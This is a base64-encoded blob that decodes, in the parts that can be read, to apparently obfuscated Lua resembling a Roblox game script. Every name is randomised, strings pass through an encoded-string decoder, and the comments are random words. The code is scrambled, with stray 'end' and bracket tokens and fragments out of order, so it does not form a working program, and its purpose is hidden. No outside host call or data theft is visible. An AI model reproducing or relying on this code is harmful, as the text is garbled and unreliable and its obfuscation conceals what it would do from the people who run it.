WwgaEJOcXR2b3lrcSA9CmxvY2FsIG5Gdkdib2ZORGIgPSBLZGVHTXVBT0lhLkROdk9Jc01YVmUgQnh0UFVmVFJUSiBLZGVHTXVBT0lhLkROdk9Jc01YVmU6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1ycnlaaVlOb2NMIikpCmxvY2FsIGZCVHRZZVZvb2QgPQogICAgfQoKCiAgICAgICAgSUZ2YlpncXpYTSA9IDAKbG9jYWwgYVFqR1BUZ1dheiA9IGNUUWRSTUhQYlUuZ2p1bEZwSUpFRzpicEJSaFdjRmNwKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1EZnpvQ3JKV2ZLIiksIHt0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJpREZ6aXJnV2l1IiksIHNJRk1OYk1pcFEgPSB0cnVlfSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBJRnZiWmdxelhNID0gMQplbmQKICAgIHR5RnlZUEpjTHY6eGNWeGdtZ01iUSgKICAgICAgICBXaVhQWUNwWGhFID0gdHJ1ZQogICAgbG9jYWwgcnlxelNXSkZaaCA9IHNHTFRST2VGdG86d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1rSGplVFZSelB4IikpOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVlGYWNIUVNqQ1AiKSkKICAgICAgICBlbmQKICAgIHsKICAgIHsKICAgICAgICAgICAgICAgIEFZbHhzRGpOblEuQU15Y0tBUWhoYSgxKSAtLSB6b1dDcktqdVdGIExyaWhJd29HZEcgaXNZUUFUTlBRQSBJYm5uYWNaZnpZIGFXSlVPWHJnV3MgRmhXWldCT2FTbAogICAgICAgIC0tIGhOcG9FSkRzZHAgWEROckxnRExrcyBTZGVRa3FsaEx3IFJaT0N3TmJ3UXogRXVpUGlOZGdoRyBWS29Xc3liSGtWCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPWNHSUtEb0VaZkMiKSwKICAgICAgICBrRnBiWE5pSURPID0gZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgQVlseHNEak5uUS5BTXljS0FRaGhhKDEpIC0tIHpvV0NyS2p1V0YgTHJpaEl3b0dkRyBpc1lRQVROUFFBIElibm5hY1pmelkgYVdKVU9YcmdXcyBGaFdaV0JPYVNsCiAgICBxSFlTVWdXVHlFID0gZmFsc2UsCiAgICAgICAgICAgICAgICBBU3JYWHlxeEphID0gZmFsc2UKICAgIGdacFJadEZ4QmguWllxTHdJc2JsbihRZ0xVQ2tPdGJSLCAxLCBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09ZFRmRXF0c3piYiIpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFFzeUN3blBNVVkuUm9vQkd4WUtrVChaY2ZvVkJzb0RBLmV2Y0dOQWl3ZXEoSXFjT0pYVUZMai5VdUpXUVRhZEFPLlR1TVplRVVIRVYsIDAuMTUsIDAuODUpLCBJcWNPSlhVRkxqLkxOcXJ5b3dBcGIuVHVNWmVFVUhFVikKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBkTlpRU3pRak1vID0gSVJ3VmxMSEtNdS50bVpkZGttR01yLlB5ZHhUeHNFREEuRE52T0lzTVhWZS5zbEptY3RVSlpNLm1YbHNDcHhOdnIKICAgIFdETVBoQWFBb20udHRCQnpoWlRISygiY3RqdW14YU1BbyIpLAotLSBsUWpsckhWSEJPIFJndExzdmlTRmYgV2Jrc25pTUxkYgogICAgICAgIGVuZCkKICAgICAgICBsb2NhbCBKSEpSZWt0dm1YID0gc0dMVFJPZUZ0bzp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygicnZGakt4dlhGQiIpKQpsb2NhbCBtelFCYmRyUXhUID0gSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1pV2VJWXhoVUtRIikpCiAgICAgICAgICAgICAgICBtelFCYmRyUXhULlJvSnpwSHVtc1Y6bnp2RnhUQ0RjRCgKICAgICAgICAgICAgICAgIC0tIG5DZ1BoalJjT3MgVm1wV0l3ckp6diBrU0hxeEFOU1hDIFViSVpBS29yZ0IgTU5YTlpjVktOTSBJVmpOZU5UcmdkCiAgICAgICAgcUhZU1VnV1R5RSA9IGZhbHNlCiAgICAgICAgICAgICAgICBLcUlCekJaQkRuOm5sU0FpaWNYaXUoKQpsb2NhbCBmUHZoTnRJTFN4ID0gZmlNbXdvR0hUZC5sYWluT2tnS2Z3KFdETVBoQWFBb20udHRCQnpoWlRISygiPVltcXFUaGZyU2wiKSkKICAgICAgICBDVHJkTFdtUnZQOlVjdGNLZERLckkoUXRWTHhyR1hscShKWFFOZ0lJVktXKSkKICAgIH0KYVFqR1BUZ1dhejpKUEVzb2drZ2JUKAogICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkSktyRm1XcHlYIHRoZW4KCmxvY2FsIHRtWmRka21HTXIgPSBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWJackpYT3NuTUYiKSkKICAgICAgICAgICAgcFNQaE5yRllMaS5OQVRDUXBwVkFRLnJ3VmdIRU5qWGMuelhNb3BmQ2VMQyA9IHRydWUKICAgICAgICAgICAgICAgICAgICBZWG1NallvY05wLmxhaW5Pa2dLZncoMSwgcVpLSWVOaVdHdS54Y2VuS2hOb1BYLkVhb1NidWF0a0QsIHFaS0llTmlXR3UuREx0S21sbURnUy5iUXFKbEFUQkJtKSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgQVlseHNEak5uUS5BTXljS0FRaGhhKG5ka0hyWE5FZ0kpCiAgICBqcHFNeVdVR1NGID0gYVV1d21QdkFsQSwKICAgICAgICAgICAgICAgIGtxTlVwaVBjS2MoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9TFZZSXdMZkhnWiIpKQogICAgZnVuY3Rpb24oKQotLSBbe0RHbVp0RmptUVJ9XQogICAgICAgIFB5ZHhUeHNFREEuQUhkVHZja29uYzpuenZGeFRDRGNEKAogICAgICAgIGlRbG1OeEpQcFogPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09SmtCQkd1VVZJRCIpLApmUHZoTnRJTFN4LlZSRm1TY0JISFIgPSB2RmZrUUR2TVdyLmxhaW5Pa2dLZncoMC41LCAwLjUpCikKICAgICAgICBpZiBtZWl6Z1FCQlppID09IFdETVBoQWFBb20udHRCQnpoWlRISygiNUZHUiIpIEJ4dFBVZlRSVEogbUhOeWFFckplby5IZ3NEbW5YeWdXID09IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ieXFxQk5EanNoIikgdGhlbgogICAgICAgICAgICBpZiBiRWhJcVR6b1R0IGROWlFTelFqTW8gdGhlbgogICAgfQogICAgc216a2ZkWFlXZAogICAgICAgICAgICBaa1VSZ3RjbVBCOmNuRWxPdVZzWUgoKQoKICAgICAgICAgICAgICAgICAgICBvSE1NU3pDRE51ID0gc0dMVFJPZUZ0by5EQmRLWmxtSXpGLlVhS0ZVUGh0U3Q6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09RVlqTU5DaGNkYiIpKQpsb2NhbCBnSHVTVFRiRUZsID0gYndlSnFIelVNSTp4Y1Z4Z21nTWJRKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1CUFl1ZWthQ0dZIiksIHsKKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdkhTb0R5TmNyRTpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1KZVZWZGZUQVdqIikpCmxvY2FsIFJ0a1Z3TGNTYW8gPQp9KQogICAgZnVuY3Rpb24oKQotLSBjUnFyZkppR2tvIGJ3ZUpxSHpVTUkgYmZXT0pMV1pyTiBOaEZPYmRtSHZ5IE1xY3dCbGlWeXIgQ3duYVFQY1FwbCBsdWdLWm9yZURMCgogICAgICAgIEVST2VUWXRjcXogPSBzbEptY3RVSlpNLm1YbHNDcHhOdnIKICAgICAgICAgICAgaWYgcEp6THhvWFFIYS5BU3JYWHlxeEphIHRoZW4KKQogICAgICAgICAgICBsb2NhbCB6RENoU0hlS3FhID0gewoKCiAgICAgICAgUUNKcmxhSVRmZCA9IDUwLAp9KQogICAgICAgIEh0U0pmaE1wSnIgPSBzbEptY3RVSlpNLm1YbHNDcHhOdnIKICAgIHJncmdESEZ2RkUudGp1V2xUc1h6ZSA9IFpqUGRxWFBublgKYndlSnFIelVNSTpBelNYQVJQblpQKAoKCiAgICAgICAgICAgICAgICAgICAgZW5kCmVuZAogICAgICAgIHNJRk1OYk1pcFEgPSAxNiwKZW5kCi0tIHlaWGZrRVhQQ20uV2dydmxibHZMZiA9IFFzeUN3blBNVVkubGFpbk9rZ0tmdygwLjQsIDAsIDAuMjUsIDApIC0tIG9NZXlBUXdhYk8gbUR1dmdRd2ltTyBNcWN3QmxpVnlyIGZlaUZJemFKTXggaXNZUUFUTlBRQSBtRHV2Z1F3aW1PIHJkR2lpWmJJcmQKICAgICAgICBoWFRtWGtzRkpPIFBjcGNya1JsQnosIEJvTGh2ZnlaSm0gSlpsb3VocEhsVCBueE9nUmphd2ZFKFJkdWRib0dXbkcpIExKV1RkYlBhbHcKICAgIGVuZAotLSBZU2dSSXhLbVdxIGV0Z2Nkd0lYR3MkIFVsem5mcU9acm4gZlFNUlF4ZHJFbwoKCiAgICAgICAgICAgICAgICAgICAgIHRoZW4KICAgICAgICApCgpsb2NhbCBGekxUZkhDalBwID0KbG9jYWwgQ1NrVEVZQ1JxaSA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1SdklsZ05ZbURZIikpCiAgICAgICAgICAgIEhVbUZydGtxbVY6eEZGVUpUUlV6Qyh7CiAgICAgICAga0ZwYlhOaUlETyA9IGZ1bmN0aW9uKEdSdEVmbHdYR3cpCiAgICAgICAgICAgICAgICAgICAgaWYgdnpsYUxDdGV4eSB0aGVuCiAgICAgICAgZnVuY3Rpb24oKQoKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBBWWx4c0RqTm5RLkZoV1pXQk9hU2woV0pTSVZyRVdzcikKCiAgICAgICAgICAgICAgICBBWWx4c0RqTm5RLkFNeWNLQVFoaGEoMC4wMSkKTXBwYmlYWGFvSS5JRnZiWmdxelhNID0gMQogICAgICAgIEFZbHhzRGpOblEuQU15Y0tBUWhoYSgxLjgpCiAgICAgICAgbG9jYWwgUlJYUk1DUFpRdCA9IHJwdFlGQWlvZ1dbWmNmb1ZCc29EQS5RbXZvdXZRR21SKCNycHRZRkFpb2dXKV0KY0hKVklmbUlQSiA9IGNISlZJZm1JUEogRWNJeXBPa1FZVSB7fQogICAgICAgIGVuZAoKICAgICAgICAgICAgZW5kCiAgICBrRnBiWE5pSURPID0gZnVuY3Rpb24oREtPZ2hkanByYykKbG9jYWwgYkxMeUVIcVhmWiA9IGZpTW13b0dIVGQubGFpbk9rZ0tmdyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoInZXdVBXTWhGQ3ciKSkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcU5GS0pvc09yWSA9IFFlSk1MU0RDYlAuZGJHR2tGZVFXZwogICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAganBxTXlXVUdTRiA9IHtXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1XWWVzZHZsZGt3Iil9LAogICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCJiRmxzam9tdk1GIiksCiAgICAgICAgICAgICAgICBpZiB2WWtUdWladlZkLllzY2ZXT0ZYY3QgPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUpWVGVacXBvakgiKSB0aGVuCiAgICAgICAgZW5kCiAgICBrcU5VcGlQY0tjKFdETVBoQWFBb20udHRCQnpoWlRISygiQ1hOSmdEdG5kUyIpKQogICAgICAgICAgICAgICAgeU9xQ3VjcVJvcy5wUmhXVUlIakRXID0gdEJ6ZE5CY1hOZi5uUmtFckdKbkp3KDI1NSwgMjU1LCAyNTUpCiAgICBxV0lhTExUbkFtID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJUckdUQk15S2N3IiksCiAgICB9CiAgICAgICAgICAgIGVuZApsb2NhbCBjeW1rR1llV3RJID0gSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiR3RPZ3JMeExQTyIpKQogICAgaFhUbVhrc0ZKTyBQY3BjcmtSbEJ6LCB2Rm9PRG5vdGFVIEpabG91aHBIbFQgR25VdkxIb3N1TihzR0xUUk9lRnRvOmZqcGpUUEJHbnUoKSkgTEpXVGRiUGFsdwogICAgICAgICAgICAgICAgICAgICAgICB2SFNvRHlOY3JFLnRkU2dOcklTSnMgPSBmYWxzZQogICAgICAgICAgICAgICAgbEZ2anJKR21tVC5xQkpTYUdxVVdxLmd0RExwYnpNbXYgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1FbXBkbkNweEtpIikKICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oTFlLZnlRQWNTRSkKICAgICAgICB5WGtaSFdIYVlOID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9SlBmQm9rbUFPdSIpLApjVFFkUk1IUGJVLmdRSUFRbm1adnQ6YnBCUmhXY0ZjcChXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09UkRFQlBUcm1zVyIpLCB7CmxvY2FsIHpNTERLaVhBeFggPSB7fQogICAgICAgICAgICAgICAgICAgIGVuZAopCiAgICAgICAgZW5kCiAgICBrRnBiWE5pSURPID0gZnVuY3Rpb24oSGdzRG1uWHlnVykKZW5kCiAgICAgICAgICAgIC0tIEhqcWJweWZWdU0gSUFRaElzSE5udiBmSkpQU2JGcEVyIGxpZk9xTnJDdnIsIGpzdUhaTnVQR0kgVkhqYWV5ZWN6cSBrWktjUnlGUnNiCiAgICBlbmQKICAgIGZ1bmN0aW9uKERLT2doZGpwcmMpCmxvY2FsIFVWUkJ0Q05RdFogPSBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PXhMZkJOUGx1VmwiKSkKICAgICAgICAgICAgICAgICAgICAtLSBLTFB3RGJzSERRIFVsem5mcU9acm4gZkpKUFNiRnBFciBKb3FRcGVWS1dvLCBVbHpuZnFPWnJuIEpvcVFwZVZLV28gcVNpdWp0TnlQRCBmVWFkYVdVZEh1IGtaS2NSeUZSc2IKCiAgICAgICAgc0lGTU5iTWlwUSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1kVGZFcXRzemJiIiksCiAgICAgICAgICAgICAgICBRcFFDekJVVkNnKFdETVBoQWFBb20udHRCQnpoWlRISygiPVVTZUJvU0JBSUsiKSkKICAgICAgICBpZiBiRWhJcVR6b1R0IE9DZW5MaFF2VHAgdGhlbgogICAgICAgICAgICAgICAgdVZEam9nVU5TcCB2WWtUdWladlZkLllzY2ZXT0ZYY3QgPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUlOYnNsaWdvbmIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgZW5kCiAgICAgICAgc0lGTU5iTWlwUSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgb0hNTVN6Q0ROdSA9IHNHTFRST2VGdG8uREJkS1psbUl6Ri5VYUtGVVBodFN0OndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9TmhwTUF0U21GSCIpKQotLSBNSGlwbHpQV1d4IGJmV09KTFdack4gc01SS1ZjaGxJZyBBZXdWTERjeVBFIHVpbEpyYVVSZkoga3JvT3lSdlNSQyAobEF2dGZ1dFRDRCBmVWFkYVdVZEh1IGtaS2NSeUZSc2IgRUhLbHNvQmR0UykKWGl3WmVqbXBCeC5FZ0FpRkp0T1l4Om56dkZ4VENEY0QoZnVuY3Rpb24oKQogICAgc0lGTU5iTWlwUSA9IG5pbAotLSBxT1VSWkxCc2dnIG1oaktSSEdMZnkgckNRSkZVamRiTyBmVWFkYVdVZEh1IHBtc1B5SldmQWkgKGNxb0hSeEtkZHMgVWx6bmZxT1pybiBBWFdSWW5kclRsKQp5elFQdGRSUlpGLnVpbEpyYVVSZkogPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj00MmIwUlhkQ3QyWXB4MlEiKQogICAgICAgICAgICAgICAgZW5kCiAgICBjVFFkUk1IUGJVLlNHYklqSkZFaW46YnBCUmhXY0ZjcCgKICAgIH0KICAgICAgICBzSUZNTmJNaXBRID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWRUZkVxdHN6YmIiKSwKbG9jYWwgU0tvZXhsT05USiA9IGNUUWRSTUhQYlUuaUxkb3BHV1VLUjpicEJSaFdjRmNwKFdETVBoQWFBb20udHRCQnpoWlRISygiTGhWc3ZOVFFRTiIpLCB7dGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT13cnJpTk9hQnJwIiksIHNJRk1OYk1pcFEgPSBmYWxzZX0pCiAgICAgICAgcUhZU1VnV1R5RSA9IGZhbHNlLAogICAgaWYgc1lkQ0hzb3RxUCB0aGVuCiAgICB9CiAgICAgICAgUHVMcUJDTGlYZiB2WWtUdWladlZkLnJOQ1JCYVVHckYgTEpXVGRiUGFsdwogICAgICAgICAgICAgICAgICAgICAgICB2SFNvRHlOY3JFOlVHUEdySExTcGcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9Q1N3T09nR1BGeSIpKSBFY0l5cE9rUVlVIHZIU29EeU5jckU6VUdQR3JITFNwZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09TlhHWE55S1VQQiIpKSBFY0l5cE9rUVlVIHZIU29EeU5jckU6VUdQR3JITFNwZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjBOV1ptWldSa3hXWnBaa1pQaEdkd1ZHUiIpKSBFY0l5cE9rUVlVCiAgICAgICAgICAgIGxvY2FsIHNGSGxQRlViRmogPSBIUFpzUHNsa1ZBOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWJ5cXFCTkRqc2giKSkKCgopCiAgICAgICAgICAgIGlmIGxGdmpySkdtbVQ6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIkpZanZBbk1aQkUiKSkgQnh0UFVmVFJUSiBrbk53SHpyQktRLmtJRVNncHR2VHEgdGhlbgotLSBSdGtWd0xjU2FvIFNHYklqSkZFaW4gQnVBc09Ia1NWQgogICAgc216a2ZkWFlXZAogICAgICAgIHZZa1R1aVp2VmQuWXNjZldPRlhjdCA9IEhnc0Rtblh5Z1cKbG9jYWwgblJ3V3pNTGdLQSA9IGZhbHNlCgpNcHBiaVhYYW9JLlJlcVRlbWNzd2UgPSB0QnpkTkJjWE5mLm5Sa0VyR0puSncoMTg2LCAxMTUsIDIxMSkgLS0gWXBtS3NzV2JXUSBOeFdpcHNUaWhwIFBhRWVESldrRmUKICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj12b2xrZkJXYnhrIiksCiAgICAgICAgICAgIFB1THFCQ0xpWGYgY0hKVklmbUlQSi5hbGVBVmZxc3h4IExKV1RkYlBhbHcKICAgIGtJRVNncHR2VHEgPSBsRnZqckpHbW1UOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJKWWp2QW5NWkJFIikpIEJ4dFBVZlRSVEogbEZ2anJKR21tVC5xQkpTYUdxVVdxLmd0RExwYnpNbXYgRWNJeXBPa1FZVSBuaWwsCiAgICAgICAgaWYgWmtVUmd0Y21QQiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIElGdmJaZ3F6WE0gPSAxCmZ1bmN0aW9uIEVKZ0pBckhWRWwoKQoKICAgICAgICAgICAgICAgICAgICB2Tm5tSG5JWGNXOlhiaUFUdmdQVWwodHJ1ZSwgcVpLSWVOaVdHdS5admdHQmtsYmZPLkJpTElMZUVSRGMsIGZhbHNlLCBJUndWbExIS011KQogICAgbG9jYWwgWmtVUmd0Y21QQiA9IEtkZUdNdUFPSWEucFNQaE5yRllMaTp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1zY2VXdk1ySHpiIikpCiAgICAgICAgSkR3cEpGa1dseCA9IEhnc0Rtblh5Z1cKICAgIFdETVBoQWFBb20udHRCQnpoWlRISygiPT1FRXpNQ1p4QmRaIiksCmxvY2FsIEFYVGJ6RUxQSHQgPSBaalBkcVhQbm5YOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9a0hqZVRWUnpQeCIpKTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ZRmFjSFFTakNQIikpCiAgICBsb2NhbCBEQmRLWmxtSXpGID0gWmpQZHFYUG5uWDpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPWtIamVUVlJ6UHgiKSwgNSkKICAgIGJ3ZUpxSHpVTUk6eGNWeGdtZ01iUSgKICAgIGZ1bmN0aW9uKGRpc2JGSGlZTkwpCiAgICAgICAgZ1pwUlp0RnhCaC5aWXFMd0lzYmxuKFJkdWRib0dXbkcsIEJvTGh2ZnlaSm0udWlsSnJhVVJmSikKICAgICAgICBnWnBSWnRGeEJoLlpZcUx3SXNibG4oT0txSXJacndkbiwgdkhTb0R5TmNyRS51aWxKcmFVUmZKKQoKCiAgICAgICAgICAgICAgICB5WGtaSFdIYVlOID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUJxc2hNSVFrUFciKSwKLS0gLS0gRkJsVmhCU0ptUCBZRmdTZk5aV05hIFdETVBoQWFBb20udHRCQnpoWlRISygidnh4TWp2WVZkUyIpCmxvY2FsIGJ3ZUpxSHpVTUkgPSBjVFFkUk1IUGJVLmlMZG9wR1dVS1I6cW9MVHdwVHVoWShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIkNMQUJ5VHZXcHgiKSkKCmVuZAogICAgcmV0dXJuIGNYdVZvVnFxZ2wKICAgIGNUUWRSTUhQYlUuU0diSWpKRkVpbjpicEJSaFdjRmNwKApsb2NhbCBmdW5jdGlvbiB0Q1hBZXlYYm1NKCkKICAgICAgICAgICAgU25GQ2Jaalh2bzpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiV1pIUG5vTEtjcyIpKTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPT1KV1lqZWpZVkR6IikpOlVjdGNLZERLckkoalN3RVRmblFkTikKICAgICAgICAgICAgbG9jYWwgcEp6THhvWFFIYSA9IHsKbG9jYWwgRUdJaFJnWHVCTCA9IFpqUGRxWFBublg6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoInJ2RmpLeHZYRkIiKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB4akxpZnZLYU9rCiAgICBqcHFNeVdVR1NGID0gewoKZW5kCmlmIGJFaElxVHpvVHQgSVJ3VmxMSEtNdTpxSEJ1SGdRSmpwKCkgdGhlbgoKICAgICAgICAgICAgICAgICAgICAgICAgUXBRQ3pCVVZDZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1RU2hISkxXSlZUIikgLi4gKHNjVVloRHFBTFMgQnh0UFVmVFJUSiBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIlB2VkFLVU9IQmwiKSBFY0l5cE9rUVlVIFdETVBoQWFBb20udHRCQnpoWlRISygiPT1GcE9sdFlUT2h2IikpKQogICAgICAgIGVuZAoKUUhjcVhyYm1Tci5jWHlMaURiVFRQID0gMQogICAgZW5kCiAgICAgICAgICAgICAgICAgICAgVVZSQnRDTlF0Wi5KSFNXQWpScHZtID0gb2JQS2h5b3VnVAogICAgICAgICAgICAgICAgZW5kCgpsb2NhbCBid2VKcUh6VU1JID0gY1RRZFJNSFBiVS56d1VMVFJxb0NVOnFvTFR3cFR1aFkoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJCcGxDR29VbkpYIikpCiAgICAgICAganBxTXlXVUdTRiA9IHtXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09enZkT0JpRWZPeiIpLCBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1YR21wb0NnTFp4Iil9LAoKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBRcFFDekJVVkNnKHJ3VGFHUEZvUmwobmh1VWZSSHZXdCkgLi4gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9dGllV0lWVHhCaiIpIC4uIHJ3VGFHUEZvUmwodkhTb0R5TmNyRSkpCiAgICBlbmQKZW5kKQotLSAvLyBDblJUclRwaGJCIGZNaE52SWJWVE8gLy8gLS0KICAgICAgICBlbmQKbG9jYWwgSkR3cEpGa1dseCA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPVdZZXNkdmxka3ciKQogICAgICAgICAgICApCmxvY2FsIFlvUHZqb2pUSXggPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09R0lKWHZ3aklCTSIpCiAgICBpZiB3bmxDblFic0NMIEJ4dFBVZlRSVEogb2JQS2h5b3VnVDpVR1BHckhMU3BnKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1VaHJ0U0RvbWJ1IikpIEJ4dFBVZlRSVEogQVhUYnpFTFBIdDp3TnFKaVRkeXBVKFZUa1JiT1hzYkwpIH49IG5pbCB0aGVuCi0tIE1IaXBselBXV3ggYmZXT0pMV1pyTiBOREtOQm1IeEZ1IGFlTlBRdlVIUGcgcGVPSFJteGhieiB4Vm1aaVB5eXpNIFlpcU56Q1dPTEksIHlSemVwTFp3UkQsIENLbXVETUFqRU8gYWVOUFF2VUhQZwoKKQogICAgICAgICAgICB7CiAgICByZXR1cm4gUEFIc3BlU1B0azpRelRlVnJMVlNyKCkgPCB2TUJIR3B6bm5BOlF6VGVWckxWU3IoKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgaWYgYkVoSXFUem9UdCBBWFRiekVMUEh0IHRoZW4KICAgICAgICAgICAgbG9jYWwgc2x0UG1KTHltdiA9IFB5ZHhUeHNFREEuRE52T0lzTVhWZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2xKbWN0VUpaTS5tWGxzQ3B4TnZyID0gV2dCQVB3Q2lYZC5tWGxzQ3B4TnZyICsgekZSRWFoQmhkaC5sYWluT2tnS2Z3KDAsIDUsIDApCiAgICBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoInd4cVRoV3lVdWQiKSwKfSkKbG9jYWwgbXpRQmJkclF4VCA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09aVdlSVl4aFVLUSIpKQpsb2NhbCBFdVBoZlJPUUtTID0gUGFqdlBqbm14UDpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPWdieFFsdVZmdGciKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgUHVMcUJDTGlYZiBaUWVFWnpSQVp5IExKV1RkYlBhbHcKICAgIGVuZAogICAgICAgICAgICAgICAgICAgIFViSVpBS29yZ0I6aXZHYXJsREpyWCgpCiAgICAgICAgICAgICAgICAgICAgaWYgdWV5Rk15YkFXZCB0aGVuCiAgICAgICAgICAgICAgICBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9amVXeXhoUFNMUCIpKTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiV1pIUG5vTEtjcyIpKTpFTGpjeUdmeGt6KFdETVBoQWFBb20udHRCQnpoWlRISygiPT1LWmtlbmtsaGJ6IikpOmNSdWRNT1FCWksoKQppZgpsb2NhbCBPS3FJclpyd2RuID0ge30KICAgICAgICAgICAgSHRmbE1va1l4TjpWSk1HY2pBc3VkKG1YbHNDcHhOdnIubGFpbk9rZ0tmdyh5dmJOeW11UkppKSkKICAgICAgICBrRnBiWE5pSURPID0gZnVuY3Rpb24oR1J0RWZsd1hHdykKICAgICAgICAgICAgICAgIFF5ckdmQk5YU0QoKQogICAgICAgIEFNeWNLQVFoaGEoMC4xKSAtLSB6b1dDcktqdVdGIEpyTVdaTVlxYWMgTHJpaEl3b0dkRyBlRHJESFZxZmp0IGpXWUhCeGZWVHYKCiAgICAgICAgc0lGTU5iTWlwUSA9IHRydWUsCiAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUtOQnVIQmZUR04iKSwKICAgIH0KICAgICAgICAgICAgc216a2ZkWFlXZAogICAgc0lGTU5iTWlwUSA9IFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoV0RNUGhBYUFvbS50dEJCemhaVEhLKFdETVBoQWFBb20udHRCQnpoWlRISygiIikpKSkpKSksCiAgICAgICAgZW5kCiAgICAzLApiTEx5RUhx